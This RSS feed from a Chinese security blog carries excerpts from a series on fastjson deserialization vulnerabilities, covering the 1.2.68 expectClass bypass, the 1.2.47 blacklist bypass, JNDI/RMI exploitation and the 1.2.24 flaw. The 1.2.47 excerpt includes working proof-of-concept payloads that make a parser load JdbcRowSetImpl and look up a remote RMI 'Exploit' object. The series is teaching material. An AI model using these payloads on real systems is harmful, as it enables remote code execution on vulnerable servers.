<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Fastjson on 整点Bug</title><link>https://www.typesafe.cn/tags/fastjson/</link><description>Recent content in Fastjson on 整点Bug</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sat, 06 Nov 2021 17:16:00 +0800</lastBuildDate><atom:link href="https://www.typesafe.cn/tags/fastjson/index.xml" rel="self" type="application/rss+xml"/><item><title>Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</link><pubDate>Sat, 06 Nov 2021 17:16:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson--1268-expectclass-绕过原理">Fastjson &amp;lt;= 1.2.68 expectClass 绕过原理&lt;/h2>
&lt;p>当 fastjson 更新到 1.2.68 之后，大部分安全漏洞都已经封堵住了，但不排除还有人手里握着一些 0day 没有放出来。&lt;/p>
&lt;p>fastjson 1.2.68 在进行反序列化的时候，会进入 &lt;code>ObjectDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 方法，而 安全人员发现 当 &lt;code>@type&lt;/code> 为 &lt;code>java.lang.AutoCloseable&lt;/code> 的时候会找到实现类 &lt;code>JavaBeanDeserializer&lt;/code> 调用 &lt;code>deserialze&lt;/code>，而 &lt;code>JavaBeanDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 方法还会继续解析得到第二个 &lt;code>@type&lt;/code> 对应的值进行反序列化，并且 &lt;code>expectClass&lt;/code> 则不再是 &lt;code>null&lt;/code> 值，而是 &lt;code>java.lang.AutoCloseable&lt;/code>。&lt;/p>
&lt;p>&lt;code>JavaBeanDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 部分代码示例。&lt;/p>
&lt;pre tabindex="0">&lt;code>if (lexer.token() == JSONToken.LITERAL_STRING) {
 // 第二个 @type 的值
 String typeName = lexer.stringVal();
 lexer.nextToken(JSONToken.COMMA);

 if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
 if (lexer.token() == JSONToken.RBRACE) {
 lexer.nextToken();
 break;
 }
 continue;
 }
 
 // 这里没有获取到 deserializer
 ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
 Class&amp;lt;?&amp;gt; userType = null;

 if (deserializer == null) {
 // 第一个 @type 的值 
 Class&amp;lt;?&amp;gt; expectClass = TypeUtils.getClass(type);
 // 在包含 expectClass 时会绕过
 userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
 deserializer = parser.getConfig().getDeserializer(userType);
 }
 
 // 再次进行反序列化，会触发反射构造实例
 Object typedObject = deserializer.deserialze(parser, userType, fieldName);
 if (deserializer instanceof JavaBeanDeserializer) {
 JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;
 if (typeKey != null) {
 FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);
 if (typeKeyFieldDeser != null) {
 typeKeyFieldDeser.setValue(typedObject, typeName);
 }
 }
 }
 return (T) typedObject;
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>ParseConfig&lt;/code> 的 &lt;code>checkAutoType&lt;/code> 部分代码示例，只要第二个 &lt;code>@type&lt;/code> 继承了 第一个 &lt;code>@type&lt;/code> 即可触发。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</link><pubDate>Sun, 31 Oct 2021 21:31:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson--1247-poc">Fastjson &amp;lt;= 1.2.47 POC&lt;/h2>
&lt;p>随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。&lt;/p>
&lt;p>我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval3&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>不出意料的话会出现这样的错误提示信息：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是因为 fastjson 使用了黑名单机制，禁止将 &lt;code>com.sun.rowset.JdbcRowSetImpl&lt;/code> 反序列化。&lt;/p>
&lt;p>下面我们使用新的 POC 进行测试，又可以利用成功了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval5&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload 格式化之后如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;a&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;b&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#ff79c6">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="fastjson--1247-绕过原理">Fastjson &amp;lt;= 1.2.47 绕过原理&lt;/h2>
&lt;p>在学习绕过原理之前，了解 fastjson 的基本解析流程还是有必要的，我画了一张类图仅供参考，图中只画了主要流程，还有很多类没有画。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</link><pubDate>Sat, 30 Oct 2021 13:43:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="jndi-是什么">JNDI 是什么&lt;/h2>
&lt;p>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。&lt;/p>
&lt;p>JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。&lt;/p>
&lt;ul>
&lt;li>轻量级目录访问协议 (LDAP)&lt;/li>
&lt;li>CORBA 公共对象服务命名（COS naming）&lt;/li>
&lt;li>Java 远程方法调用 (RMI)&lt;/li>
&lt;li>域名服务 (DNS)&lt;/li>
&lt;/ul>
&lt;p>这么说起来还是有点抽象，简单理解就是&lt;strong>服务提供者&lt;/strong>提供一个类似Key Value的数据，&lt;strong>JNDI&lt;/strong>可以通过这个 Key 获取到&lt;strong>服务提供者&lt;/strong>上的提供的Value，因此JNDI是无法单独使用的。&lt;/p>
&lt;p>使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。&lt;/p>
&lt;pre tabindex="0">&lt;code>// 创建一个上下文对象
InitialContext context = new InitialContext();
// 查找监听在本地 1099 端口上 RMI 服务的 Object 对象
Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;);
&lt;/code>&lt;/pre>&lt;h2 id="rmi-是什么">RMI 是什么&lt;/h2>
&lt;p>RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。&lt;/p>
&lt;p>RMI 有三个概念：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Registry :&lt;/strong> 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。&lt;/li>
&lt;li>&lt;strong>Server :&lt;/strong> 远程方法的提供者。&lt;/li>
&lt;li>&lt;strong>Client :&lt;/strong> 远程方法的调用者。&lt;/li>
&lt;/ul>
&lt;p>远程方法的定义需要满足两个条件：&lt;/p>
&lt;ol>
&lt;li>实现 &lt;code>java.rmi.Remote&lt;/code>。&lt;/li>
&lt;li>继承 &lt;code>java.rmi.server.UnicastRemoteObject&lt;/code>。&lt;/li>
&lt;/ol>
&lt;h2 id="rmi-使用示例">RMI 使用示例&lt;/h2>
&lt;h3 id="registry">Registry&lt;/h3>
&lt;p>创建 Registry&lt;/p></description></item><item><title>Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</link><pubDate>Thu, 21 Oct 2021 22:56:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson-是什么">Fastjson 是什么&lt;/h2>
&lt;blockquote>
&lt;p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。&lt;/p>&lt;/blockquote>
&lt;p>以上摘自Fastjson GitHub 介绍。&lt;/p>
&lt;p>但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 &lt;strong>NACOS&lt;/strong> 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 &lt;a href="https://github.com/alibaba/nacos/releases/tag/1.3.0">https://github.com/alibaba/nacos/releases/tag/1.3.0&lt;/a>) ，可见漏洞危害之大。&lt;/p>
&lt;h2 id="为什么会弃用-fastjson-">为什么会弃用 Fastjson ？&lt;/h2>
&lt;p>想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 &lt;strong>CVE-2017-18349&lt;/strong> 这一条，而 Jackson 竟然有高达 76 条。&lt;/p>
&lt;p>这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。&lt;/p>
&lt;p>那为什么会有公司弃用 Fastjson 呢？&lt;/p>
&lt;p>或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。&lt;/p>
&lt;p>尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。&lt;/p>
&lt;h2 id="fastjson-漏洞产生原因">Fastjson 漏洞产生原因&lt;/h2>
&lt;p>Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 &lt;a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315&lt;/a> 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version &amp;lt;= 1.2.24 时漏洞是如何产生的。&lt;/p></description></item></channel></rss>